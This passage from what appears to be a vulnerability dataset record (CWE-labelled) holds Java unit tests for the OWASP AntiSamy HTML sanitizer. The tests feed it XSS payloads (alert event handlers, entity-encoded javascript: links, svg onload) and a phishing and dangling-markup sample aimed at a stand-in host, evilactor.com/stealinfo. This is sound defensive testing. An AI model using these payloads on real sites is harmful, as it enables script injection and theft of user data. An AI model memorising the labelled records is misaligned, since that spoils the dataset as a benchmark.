name=\\\"allowFullScreen\\\" value=\\\"true\\\" /><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\" /></object>\";\n        saxExpectedOutput = \"<object width=\\\"560\\\" height=\\\"340\\\"><param name=\\\"movie\\\" value=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" /><param name=\\\"allowFullScreen\\\" value=\\\"true\\\" /><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\" /></object>\";\n\n        cr = as.scan(input, revised, AntiSamy.DOM);\n        assertThat(cr.getCleanHTML(), containsString(expectedOutput));\n        CleanResults scan = as.scan(input, revised, AntiSamy.SAX);\n        assertThat(scan.getCleanHTML(), equalTo(saxExpectedOutput));\n    }\n\n    @Test\n    public void compareSpeedsShortStrings() throws IOException, ScanException, PolicyException {\n\n        double totalDomTime = 0;\n        double totalSaxTime = 0;\n\n        int testReps = 1000;\n\n        String html = \"<body> hey you <img/> out there on your own </body>\";\n\n        for (int j = 0; j < testReps; j++) {\n            totalDomTime += as.scan(html, policy, AntiSamy.DOM).getScanTime();\n            totalSaxTime += as.scan(html, policy, AntiSamy.SAX).getScanTime();\n        }\n\n        System.out.println(\"Total DOM time short string: \" + totalDomTime);\n        System.out.println(\"Total SAX time short string: \" + totalSaxTime);\n    }\n\n    @Test\n    public void profileDom() throws IOException, ScanException, PolicyException {\n        runProfiledTest(AntiSamy.DOM);\n    }\n\n    @Test\n    public void profileSax() throws IOException, ScanException, PolicyException {\n        runProfiledTest(AntiSamy.SAX);\n    }\n\n    private void runProfiledTest(int scanType) throws ScanException, PolicyException {\n        double totalDomTime;\n\n        warmup(scanType);\n\n        int testReps = 9999;\n\n        String html = \"<body> hey you <img/> out there on your own </body>\";\n\n        Double each = 0D;\n        int repeats = 10;\n        for (int i = 0; i < repeats; i++) {\n            totalDomTime = 0;\n            for (int j = 0; j < testReps; j++) {\n                totalDomTime += as.scan(html, policy, scanType).getScanTime();\n            }\n            each = each + totalDomTime;\n            System.out.println(\"Total \" + (scanType == AntiSamy.DOM ? \"DOM\" : \"SAX\") + \" time 9999 reps short string: \" + totalDomTime);\n        }\n        System.out.println(\"Average time: \" + (each / repeats));\n    }\n\n    private void warmup(int scanType) throws ScanException, PolicyException {\n        int warmupReps = 15000;\n\n        String html = \"<body> hey you <img/> out there on your own </body>\";\n\n        for (int j = 0; j < warmupReps; j++) {\n            as.scan(html, policy, scanType).getScanTime();\n        }\n    }\n\n    @Test\n    public void comparePatternSpeed() throws IOException, ScanException, PolicyException {\n\n        final Pattern invalidXmlCharacters =\n                Pattern.compile(\"[\\\\u0000-\\\\u001F\\\\uD800-\\\\uDFFF\\\\uFFFE-\\\\uFFFF&&[^\\\\u0009\\\\u000A\\\\u000D]]\");\n\n        int testReps = 10000;\n\n        String html = \"<body> hey you <img/> out there on your own </body>\";\n\n        String s = null;\n        //long start = System.currentTimeMillis();\n        for (int j = 0; j < testReps; j++) {\n            s = invalidXmlCharacters.matcher(html).replaceAll(\"\");\n        }\n        //long total = System.currentTimeMillis() - start;\n\n        //start = System.currentTimeMillis();\n        Matcher matcher;\n        for (int j = 0; j < testReps; j++) {\n            matcher = invalidXmlCharacters.matcher(html);\n            if (matcher.matches()) {\n                s = matcher.replaceAll(\"\");\n            }\n        }\n        //long total2 = System.currentTimeMillis() - start;\n\n        assertNotNull(s);\n        //System.out.println(\"replaceAllDirect \" + total);\n        //System.out.println(\"match then replace: \" + total2);\n    }\n\n    @Test\n    public void testOnsiteRegex() throws ScanException, PolicyException {\n    \tassertIsGoodOnsiteURL(\"foo\");\n    \tassertIsGoodOnsiteURL(\"/foo/bar\");\n    \tassertIsGoodOnsiteURL(\"../../di.cgi?foo&amp;3D~\");\n    \tassertIsGoodOnsiteURL(\"/foo/bar/1/sdf;jsessiond=1f1f12312_123123\");\n    }\n    \n    void assertIsGoodOnsiteURL(String url) throws ScanException, PolicyException {\n    \tString html = as.scan(\"<a href=\\\"\" + url + \"\\\">X</a>\", policy, AntiSamy.DOM).getCleanHTML();\n        assertThat(html, containsString(\"href=\\\"\"));\n\t}\n    \n\t@Test\n    public void issue10() throws ScanException, PolicyException {\n    \tassertFalse(as.scan(\"<a href=\\\"javascript&colon;alert&lpar;1&rpar;\\\">X</a>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertFalse(as.scan(\"<a href=\\\"javascript&colon;alert&lpar;1&rpar;\\\">X</a>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n    }\n    \n    @Test\n    public void issue147() throws ScanException, PolicyException {\n        URL url = getClass().getResource(\"/antisamy-tinymce.xml\");\n\n        Policy pol = Policy.getInstance(url);\n        as.scan(\"<table><tr><td></td></tr></table>\", pol, AntiSamy.DOM);\n    }\n\n    @Test\n    public void issue75() throws ScanException, PolicyException {\n        URL url = getClass().getResource(\"/antisamy-tinymce.xml\");\n        Policy pol = Policy.getInstance(url);\n        as.scan(\"<script src=\\\"<. \\\">\\\"></script>\", pol, AntiSamy.DOM);\n        as.scan(\"<script src=\\\"<. \\\">\\\"></script>\", pol, AntiSamy.SAX);\n    }\n\n    @Test\n    public void issue144() throws ScanException, PolicyException {\n        String pinata = \"pi\\u00f1ata\";\n        CleanResults results = as.scan(pinata, policy, AntiSamy.DOM);\n        String cleanHTML = results.getCleanHTML();\n        assertEquals(pinata, cleanHTML);\n    }\n\n    @Test\n    public void testWhitespaceNotBeingMangled() throws ScanException, PolicyException {\n        String test = \"<select name=\\\"name\\\"><option value=\\\"Something\\\">Something</select>\";\n        String expected = \"<select name=\\\"name\\\"><option value=\\\"Something\\\">Something</option></select>\";\n        Policy preserveSpace = policy.cloneWithDirective( Policy.PRESERVE_SPACE, \"true\" );\n        CleanResults preserveSpaceResults = as.scan(test, preserveSpace, AntiSamy.SAX);\n        assertEquals( expected, preserveSpaceResults.getCleanHTML() );\n    }\n\n    @Test\n    public void testDataTag159() throws ScanException, PolicyException {\n        /* issue #159 - allow dynamic HTML5 data-* attribute */\n        String good = \"<p data-tag=\\\"abc123\\\">Hello World!</p>\";\n        String bad = \"<p dat-tag=\\\"abc123\\\">Hello World!</p>\";\n        String goodExpected = \"<p data-tag=\\\"abc123\\\">Hello World!</p>\";\n        String badExpected = \"<p>Hello World!</p>\";\n        // test good attribute \"data-\"\n        CleanResults cr = as.scan(good, policy, AntiSamy.SAX);\n        String s = cr.getCleanHTML();\n        assertEquals(goodExpected, s);\n        // test bad attribute \"dat-\"\n        cr = as.scan(bad, policy, AntiSamy.SAX);\n        s = cr.getCleanHTML();\n        assertEquals(badExpected, s);\n    }\n\n    @Test\n    public void testXSSInAntiSamy151() throws ScanException, PolicyException {\n        String test = \"<bogus>whatever</bogus><img src=\\\"https://ssl.gstatic.com/codesite/ph/images/defaultlogo.png\\\" \"\n            + \"onmouseover=\\\"alert('xss')\\\">\";\n        CleanResults results_sax = as.scan(test, policy, AntiSamy.SAX);\n        CleanResults results_dom = as.scan(test, policy, AntiSamy.DOM);\n\n        assertEquals( results_sax.getCleanHTML(), results_dom.getCleanHTML());\n        assertEquals(\"whatever<img src=\\\"https://ssl.gstatic.com/codesite/ph/images/defaultlogo.png\\\" />\", results_dom.getCleanHTML());\n    }\n\n    @Test\n    public void testAnotherXSS() throws ScanException, PolicyException {\n        String test = \"<a href=\\\"http://example.com\\\"&amp;/onclick=alert(9)>foo</a>\";\n        CleanResults results_sax = as.scan(test, policy, AntiSamy.SAX);\n        CleanResults results_dom = as.scan(test, policy, AntiSamy.DOM);\n\n        assertEquals( results_sax.getCleanHTML(), results_dom.getCleanHTML());\n        assertEquals(\"<a href=\\\"http://example.com\\\" rel=\\\"nofollow\\\">foo</a>\", results_dom.getCleanHTML());\n    }\n\n    @Test\n    public void testIssue2() throws ScanException, PolicyException {\n        String test = \"<style onload=alert(1)>h1 {color:red;}</style>\";\n        assertThat(as.scan(test, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"alert\")));\n        assertThat(as.scan(test, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"alert\")));\n    }\n    \n    /*\n     * Mailing list user sent this in. Didn't work, but good test to leave in.\n     */\n    @Test\n    public void testUnknownTags() throws ScanException, PolicyException {\n        String test = \"<%/onmouseover=prompt(1)>\";\n        CleanResults saxResults = as.scan(test, policy, AntiSamy.SAX);\n        CleanResults domResults = as.scan(test, policy, AntiSamy.DOM);\n        assertThat(saxResults.getCleanHTML(), not(containsString(\"<%/\")));\n        assertThat(domResults.getCleanHTML(), not(containsString(\"<%/\")));\n    }\n    \n    @Test\n    public void testStreamScan() throws ScanException, PolicyException, InterruptedException, ExecutionException {\n        String testImgSrcURL = \"<img src=\\\"https://ssl.gstatic.com/codesite/ph/images/defaultlogo.png\\\" \";\n        Reader reader = new StringReader(\"<bogus>whatever</bogus>\" + testImgSrcURL + \"onmouseover=\\\"alert('xss')\\\">\");\n        Writer writer = new StringWriter();\n        as.scan(reader, writer, policy);\n        String cleanHtml = writer.toString().trim();\n        assertEquals(\"whatever\" + testImgSrcURL + \"/>\", cleanHtml);\n    }\n    \n    @Test\n    public void testGithubIssue23() throws ScanException, PolicyException {\n    \t\n        // Antisamy Stripping nested lists and tables\n    \tString test23 = \"<ul><li>one</li><li>two</li><li>three<ul><li>a</li><li>b</li></ul></li></ul>\";\n    \t// Issue claims you end up with this:\n    \t//    <ul><li>one</li><li>two</li><li>three<ul></ul></li><li>a</li><li>b</li></ul>\n    \t// Meaning the <li>a</li><li>b</li> elements were moved outside of the nested <ul> list they were in\n    \t\n    \t// The a.replaceAll(\"\\\\s\",\"\") is used to strip out all the whitespace in the CleanHTML so we can successfully find\n    \t// what we expect to find.\n        assertThat(as.scan(test23, policy, AntiSamy.SAX).getCleanHTML().replaceAll(\"\\\\s\",\"\"), containsString(\"<ul><li>a</li>\"));\n        assertThat(as.scan(test23, policy, AntiSamy.DOM).getCleanHTML().replaceAll(\"\\\\s\",\"\"), containsString(\"<ul><li>a</li>\"));\n        \n        // However, the test above can't replicate this misbehavior.\n    }\n    \n    // TODO: This issue is a valid enhancement request we plan to implement in the future.\n    // Commenting out the test case for now so test failures aren't included in a released version of AntiSamy.\n/*    @Test\n    public void testGithubIssue24() throws ScanException, PolicyException {\n    \t\n        // if we have onUnknownTag set to encode, it still strips out the @ and everything else after the it\n    \t// DOM Parser actually rips out the entire <name@mail.com> value even with onUnknownTag set\n        TestPolicy revisedPolicy = policy.cloneWithDirective(\"onUnknownTag\", \"encode\");\n\n    \tString email = \"name@mail.com\";\n        String test24 = \"firstname,lastname<\" + email + \">\";\n        assertThat(as.scan(test24, revisedPolicy, AntiSamy.SAX).getCleanHTML(), containsString(email));\n        assertThat(as.scan(test24, revisedPolicy, AntiSamy.DOM).getCleanHTML(), containsString(email));\n    }\n*/\n    @Test\n    public void testGithubIssue26() throws ScanException, PolicyException {\n        // Potential bypass (False positive)\n    \tString test26 = \"&#x22;&#x3E;&#x3C;&#x69;&#x6D;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x61;&#x20;&#x6F;&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3E;\";\n    \t// Issue claims you end up with this:\n    \t//   ><img src=a onerror=alert(1)>\n    \t\n        assertThat(as.scan(test26, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"<img src=a onerror=alert(1)>\")));\n        assertThat(as.scan(test26, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"<img src=a onerror=alert(1)>\")));\n        \n        // But you actually end up with this: &quot;&gt;&lt;img src=a onerror=alert(1)&gt; -- Which is as expected\n    }\n    \n    @Test\n    public void testGithubIssue27() throws ScanException, PolicyException {\n    \t// This test doesn't cause an ArrayIndexOutOfBoundsException, as reported in this issue even though it\n    \t// replicates the test as described.\n        String test27 = \"my &test\";\n        assertThat(as.scan(test27, policy, AntiSamy.DOM).getCleanHTML(), containsString(\"test\"));\n        assertThat(as.scan(test27, policy, AntiSamy.SAX).getCleanHTML(), containsString(\"test\"));\n    }\n\nstatic final String test33 = \"<html>\\n\"\n    \t  + \"<head>\\n\"\n    \t  + \"  <title>Test</title>\\n\"\n    \t  + \"</head>\\n\"\n    \t  + \"<body>\\n\"\n    \t  + \"  <h1>Tricky Encoding</h1>\\n\"\n    \t  + \"  <h2>NOT Sanitized by AntiSamy</h2>\\n\"\n    \t  + \"  <ol>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#00058x=alert,x%281%29\\\">X&#00058;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#00058y=alert,y%281%29\\\">X&#00058;y</a></li>\\n\"\n\n    \t  + \"    <li><a href=\\\"javascript&#58x=alert,x%281%29\\\">X&#58;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#58y=alert,y%281%29\\\">X&#58;y</a></li>\\n\"\n\n    \t  + \"    <li><a href=\\\"javascript&#x0003Ax=alert,x%281%29\\\">X&#x0003A;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#x0003Ay=alert,y%281%29\\\">X&#x0003A;y</a></li>\\n\"\n\n    \t  + \"    <li><a href=\\\"javascript&#x3Ax=alert,x%281%29\\\">X&#x3A;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#x3Ay=alert,y%281%29\\\">X&#x3A;y</a></li>\\n\"\n    \t  + \"  </ol>\\n\"\n    \t  + \"  <h1>Tricky Encoding with Ampersand Encoding</h1>\\n\"\n    \t  + \"  <p>AntiSamy turns harmless payload into XSS by just decoding the encoded ampersands in the href attribute</a>\\n\"\n    \t  + \"  <ol>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&amp;#x3Ax=alert,x%281%29\\\">X&amp;#x3A;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&AMP;#x3Ax=alert,x%281%29\\\">X&AMP;#x3A;x</a></li>\\n\"\n\n    \t  + \"    <li><a href=\\\"javascript&#38;#x3Ax=alert,x%281%29\\\">X&#38;#x3A;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#00038;#x3Ax=alert,x%281%29\\\">X&#00038;#x3A;x</a></li>\\n\"\n\n    \t  + \"    <li><a href=\\\"javascript&#x26;#x3Ax=alert,x%281%29\\\">X&#x26;#x3A;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#x00026;#x3Ax=alert,x%281%29\\\">X&#x00026;#x3A;x</a></li>\\n\"\n    \t  + \"  </ol>\\n\"\n    \t  + \"  <p><a href=\\\"javascript&#x3Ax=alert,x%281%29\\\">Original without ampersand encoding</a></p>\\n\"\n    \t  + \"</body>\\n\"\n    \t  + \"</html>\";\n    \t\t\t\n    @Test\n    public void testGithubIssue33() throws ScanException, PolicyException {\n        \t\n        // Potential bypass\n\n        // Issue claims you end up with this:\n        //   javascript:x=alert and other similar problems (javascript&#00058x=alert,x%281%29) but you don't.\n        //   So issue is a false positive and has been closed.\n        //System.out.println(as.scan(test33, policy, AntiSamy.SAX).getCleanHTML());\n\n        assertThat(as.scan(test33, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"javascript&#00058x=alert,x%281%29\")));\n        assertThat(as.scan(test33, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"javascript&#00058x=alert,x%281%29\")));\n    }\n    \n    // TODO: This issue is a valid enhancement request. We are trying to decide whether to implement in the future.\n    // Commenting out the test case for now so test failures aren't included in a released version of AntiSamy.\n/*\n    @Test\n    public void testGithubIssue34a() throws ScanException, PolicyException {\n\n    \t// bypass stripNonValidXMLCharacters\n    \t// Issue indicates: \"<div>Hello\\\\uD83D\\\\uDC95</div>\" should be sanitized to: \"<div>Hello</div>\"\n    \t\n        String test34a = \"<div>Hello\\uD83D\\uDC95</div>\";\n        assertEquals(\"<div>Hello</div>\", as.scan(test34a, policy, AntiSamy.SAX).getCleanHTML());\n        assertEquals(\"<div>Hello</div>\", as.scan(test34a, policy, AntiSamy.DOM).getCleanHTML());\n    }\n\n    @Test\n    public void testGithubIssue34b() throws ScanException, PolicyException {\n\n    \t// bypass stripNonValidXMLCharacters\n    \t// Issue indicates: \"<div>Hello\\\\uD83D\\\\uDC95</div>\" should be sanitized to: \"<div>Hello</div>\"\n    \t\n        String test34b = \"\\uD888\";\n        assertEquals(\"\", as.scan(test34b, policy, AntiSamy.DOM).getCleanHTML());\n        assertEquals(\"\", as.scan(test34b, policy, AntiSamy.SAX).getCleanHTML());\n    }\n*/\n\n    static final String test40 = \"<html>\\n\"\n          + \"<head>\\n\"\n          + \"  <title>Test</title>\\n\"\n          + \"</head>\\n\"\n          + \"<body>\\n\"\n          + \"  <h1>Tricky Encoding</h1>\\n\"\n          + \"  <h2>NOT Sanitized by AntiSamy</h2>\\n\"\n          + \"  <ol>\\n\"\n          + \"    <li><h3>svg onload=alert follows:</h3><svg onload=alert(1)//</li>\\n\"\n          + \"  </ol>\\n\"\n          + \"</body>\\n\"\n          + \"</html>\";\n\n    @Test\n    public void testGithubIssue40() throws ScanException, PolicyException {\n\n        // Concern is that: <svg onload=alert(1)//  does not get cleansed.\n        // Based on these test results, it does get cleaned so this issue is a false positive, so we closed it.\n\n        assertThat(as.scan(test40, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"<svg onload=alert(1)//\")));\n        //System.out.println(\"SAX parser: \" + as.scan(test40, policy, AntiSamy.SAX).getCleanHTML());\n        assertThat(as.scan(test40, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"<svg onload=alert(1)//\")));\n        //System.out.println(\"DOM parser: \" + as.scan(test40, policy, AntiSamy.DOM).getCleanHTML());\n    }\n\n    @Test\n    public void testGithubIssue48() throws ScanException, PolicyException {\n\n        // Concern is that onsiteURL regex is not safe for URLs that start with //.\n        // For example:  //evilactor.com?param=foo\n\n        final String phishingAttempt = \"<a href=\\\"//evilactor.com/stealinfo?a=xxx&b=xxx\\\"><span style=\\\"color:red;font-size:100px\\\">\"\n                + \"You must click me</span></a>\";\n\n        // Output: <a rel=\"nofollow\"><span style=\"color: red;font-size: 100.0px;\">You must click me</span></a>\n\n        assertThat(as.scan(phishingAttempt, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"//evilactor.com/\")));\n        assertThat(as.scan(phishingAttempt, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"//evilactor.com/\")));\n\n        // This ones never failed, they're just to prove a dangling markup attack on the following resulting HTML won't work.\n        // Less probable case (steal more tags):\n        final String danglingMarkup = \"<div>User input: \" +\n                \"<input type=\\\"text\\\" name=\\\"input\\\" value=\\\"\\\"><a href='//evilactor.com?\"+\n                \"\\\"> all this info wants to be stolen with <i>danlging markup attack</i>\" +\n                \" until a single quote to close is found'</div>\";\n\n        assertThat(as.scan(danglingMarkup, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"//evilactor.com/\")));\n        assertThat(as.scan(danglingMarkup, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"//evilactor.com/\")));\n\n        // More probable case (steal just an attribute):\n        //      HTML before attack: <input type=\"text\" name=\"input\" value=\"\" data-attribute-to-steal=\"some value\">\n        final String danglingMarkup2 = \"<div>User input: \" +\n                \"<input type=\\\"text\\\" name=\\\"input\\\" value=\\\"\\\" data-attribute-to-steal=\\\"some value\\\">\";\n        \n        assertThat(as.scan(danglingMarkup2, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"//evilactor.com/\")));\n        assertThat(as.scan(danglingMarkup2, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"//evilactor.com/\")));\n    }\n\n @Test\n    public void testGithubIssue62() {\n        // Concern is that when a processing instruction is at the root level, node removal gets messy and Null pointer exception arises.\n        // More test cases are added for PI removal.\n\n        try{\n            assertThat(as.scan(\"|<?ai aaa\", policy, AntiSamy.DOM).getCleanHTML(), is(\"|\"));\n            assertThat(as.scan(\"|<?ai aaa\", policy, AntiSamy.SAX).getCleanHTML(), is(\"|\"));\n\n            assertThat(as.scan(\"<div>|<?ai aaa\", policy, AntiSamy.DOM).getCleanHTML(), is(\"<div>|</div>\"));\n            assertThat(as.scan(\"<div>|<?ai aaa\", policy, AntiSamy.SAX).getCleanHTML(), is(\"<div>|</div>\"));\n\n            assertThat(as.scan(\"<div><?foo note=\\\"I am XML processing instruction. I wish to be excluded\\\" ?></div>\", policy, AntiSamy.DOM)\n                    .getCleanHTML(), not(containsString(\"<?foo\")));\n            assertThat(as.scan(\"<div><?foo note=\\\"I am XML processing instruction. I wish to be excluded\\\" ?></div>\", policy, AntiSamy.SAX)\n                    .getCleanHTML(), not(containsString(\"<?foo\")));\n\n            assertThat(as.scan(\"<?xml-stylesheet type=\\\"text/css\\\" href=\\\"style.css\\\"?>\", policy, AntiSamy.DOM).getCleanHTML(), is(\"\"));\n            assertThat(as.scan(\"<?xml-stylesheet type=\\\"text/css\\\" href=\\\"style.css\\\"?>\", policy, AntiSamy.SAX).getCleanHTML(), is(\"\"));\n\n        } catch (Exception exc) {\n            fail(exc.getMessage());\n        }\n    }\n\n    @Test\n    public void testGithubIssue81() throws ScanException, PolicyException {\n        // Concern is that \"!important\" is missing after processing CSS\n        assertThat(as.scan(\"<p style=\\\"color: red !important\\\">Some Text</p>\", policy, AntiSamy.DOM).getCleanHTML(), containsString(\"!important\"));\n        assertThat(as.scan(\"<p style=\\\"color: red !important\\\">Some Text</p>\", policy, AntiSamy.SAX).getCleanHTML(), containsString(\"!important\"));\n\n        // Just to check scan keeps working accordingly without \"!important\"\n        assertThat(as.scan(\"<p style=\\\"color: red\\\">Some Text</p>\", policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"!important\")));\n        assertThat(as.scan(\"<p style=\\\"color: red\\\">Some Text</p>\", policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"!important\")));\n    }\n\n    @Test\n    public void entityReferenceEncodedInHtmlAttribute() throws ScanException, PolicyException {\n        // Concern is that \"&\" is not being encoded and \"#00058\" was not being interpreted as \":\"\n        // so the validations based on regexp passed and a browser would load \"&:\" together\n        assertThat(as.scan(\"<p><a href=\\\"javascript&#00058x=1,%61%6c%65%72%74%28%22%62%6f%6f%6d%22%29\\\">xss</a></p>\", policy, AntiSamy.DOM).getCleanHTML(),\n                containsString(\"javascript&amp;#00058\"));\n        assertThat(as.scan(\"<p><a href=\\\"javascript&#00058x=1,%61%6c%65%72%74%28%22%62%6f%6f%6d%22%29\\\">xss</a></p>\", policy, AntiSamy.SAX).getCleanHTML(),\n                containsString(\"javascript&amp;#00058\"));\n    }\n}\n\n",
    "target": 1,
    "language": "java",
    "dataset": "TreeVul",
    "idx": 700290,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "/*\n * Copyright (c) 2007-2021, Arshan Dabirsiaghi, Jason Li\n *\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without modification,\n * are permitted provided that the following conditions are met:\n *\n * Redistributions of source code must retain the above copyright notice, this list\n * of conditions and the following disclaimer.  Redistributions in binary form must\n * reproduce the above copyright notice, this list of conditions and the following\n * disclaimer in the documentation and/or other materials provided with the distribution.\n * Neither the name of OWASP nor the names of its contributors may be used to endorse\n * or promote products derived from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n * \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR\n * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\npackage org.owasp.validator.html.test;\n\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertFalse;\nimport static org.junit.Assert.assertNotNull;\nimport static org.junit.Assert.assertTrue;\nimport static org.junit.Assert.fail;\nimport static org.hamcrest.CoreMatchers.containsString;\nimport static org.hamcrest.CoreMatchers.equalTo;\nimport static org.hamcrest.CoreMatchers.is;\nimport static org.hamcrest.CoreMatchers.not;\nimport static org.hamcrest.MatcherAssert.assertThat;\n\nimport org.junit.Before;\nimport org.junit.Test;\n\nimport java.io.IOException;\nimport java.io.Reader;\nimport java.io.StringReader;\nimport java.io.StringWriter;\nimport java.io.Writer;\nimport java.net.URL;\nimport java.util.Collections;\nimport java.util.concurrent.ExecutionException;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\nimport org.apache.commons.codec.binary.Base64;\n\nimport org.owasp.validator.html.AntiSamy;\nimport org.owasp.validator.html.CleanResults;\nimport org.owasp.validator.html.Policy;\nimport org.owasp.validator.html.PolicyException;\nimport org.owasp.validator.html.ScanException;\nimport org.owasp.validator.html.model.Attribute;\nimport org.owasp.validator.html.model.Tag;\n\n/**\n * This class tests AntiSamy functionality and the basic policy file which\n * should be immune to XSS and CSS phishing attacks.\n * \n * The test cases titled issue##() map to the issues identified in the original AntiSamy \n * source code repo at: https://code.google.com/archive/p/owaspantisamy/issues.\n * \n * The test cases titled githubIssue##() map to the issues documented at: \n *     https://github.com/nahsra/antisamy/issues\n *\n * @author Arshan Dabirsiaghi\n */\n\npublic class AntiSamyTest {\n\n    private static final String[] BASE64_BAD_XML_STRINGS = new String[]{\n            // first string is\n            // \"<a - href=\\\"http://www.owasp.org\\\">click here</a>\"\n            \"PGEgLSBocmVmPSJodHRwOi8vd3d3Lm93YXNwLm9yZyI+Y2xpY2sgaGVyZTwvYT4=\",\n            // the rest are randomly generated 300 byte sequences which generate\n            // parser errors, turned into Strings\n            \"uz0sEy5aDiok6oufQRaYPyYOxbtlACRnfrOnUVIbOstiaoB95iw+dJYuO5sI9nudhRtSYLANlcdgO0pRb+65qKDwZ5o6GJRMWv4YajZk+7Q3W/GN295XmyWUpxuyPGVi7d5fhmtYaYNW6vxyKK1Wjn9IEhIrfvNNjtEF90vlERnz3wde4WMaKMeciqgDXuZHEApYmUcu6Wbx4Q6WcNDqohAN/qCli74tvC+Umy0ZsQGU7E+BvJJ1tLfMcSzYiz7Q15ByZOYrA2aa0wDu0no3gSatjGt6aB4h30D9xUP31LuPGZ2GdWwMfZbFcfRgDSh42JPwa1bODmt5cw0Y8ACeyrIbfk9IkX1bPpYfIgtO7TwuXjBbhh2EEixOZ2YkcsvmcOSVTvraChbxv6kP\",\n            \"PIWjMV4y+MpuNLtcY3vBRG4ZcNaCkB9wXJr3pghmFA6rVXAik+d5lei48TtnHvfvb5rQZVceWKv9cR/9IIsLokMyN0omkd8j3TV0DOh3JyBjPHFCu1Gp4Weo96h5C6RBoB0xsE4QdS2Y1sq/yiha9IebyHThAfnGU8AMC4AvZ7DDBccD2leZy2Q617ekz5grvxEG6tEcZ3fCbJn4leQVVo9MNoerim8KFHGloT+LxdgQR6YN5y1ii3bVGreM51S4TeANujdqJXp8B7B1Gk3PKCRS2T1SNFZedut45y+/w7wp5AUQCBUpIPUj6RLp+y3byWhcbZbJ70KOzTSZuYYIKLLo8047Fej43bIaghJm0F9yIKk3C5gtBcw8T5pciJoVXrTdBAK/8fMVo29P\",\n            \"uCk7HocubT6KzJw2eXpSUItZFGkr7U+D89mJw70rxdqXP2JaG04SNjx3dd84G4bz+UVPPhPO2gBAx2vHI0xhgJG9T4vffAYh2D1kenmr+8gIHt6WDNeD+HwJeAbJYhfVFMJsTuIGlYIw8+I+TARK0vqjACyRwMDAndhXnDrk4E5U3hyjqS14XX0kIDZYM6FGFPXe/s+ba2886Q8o1a7WosgqqAmt4u6R3IHOvVf5/PIeZrBJKrVptxjdjelP8Xwjq2ujWNtR3/HM1kjRlJi4xedvMRe4Rlxek0NDLC9hNd18RYi0EjzQ0bGSDDl0813yv6s6tcT6xHMzKvDcUcFRkX6BbxmoIcMsVeHM/ur6yRv834o/TT5IdiM9/wpkuICFOWIfM+Y8OWhiU6BK\",\n            \"Bb6Cqy6stJ0YhtPirRAQ8OXrPFKAeYHeuZXuC1qdHJRlweEzl4F2z/ZFG7hzr5NLZtzrRG3wm5TXl6Aua5G6v0WKcjJiS2V43WB8uY1BFK1d2y68c1gTRSF0u+VTThGjz+q/R6zE8HG8uchO+KPw64RehXDbPQ4uadiL+UwfZ4BzY1OHhvM5+2lVlibG+awtH6qzzx6zOWemTih932Lt9mMnm3FzEw7uGzPEYZ3aBV5xnbQ2a2N4UXIdm7RtIUiYFzHcLe5PZM/utJF8NdHKy0SPaKYkdXHli7g3tarzAabLZqLT4k7oemKYCn/eKRreZjqTB2E8Kc9Swf3jHDkmSvzOYE8wi1vQ3X7JtPcQ2O4muvpSa70NIE+XK1CgnnsL79Qzci1/1xgkBlNq\",\n            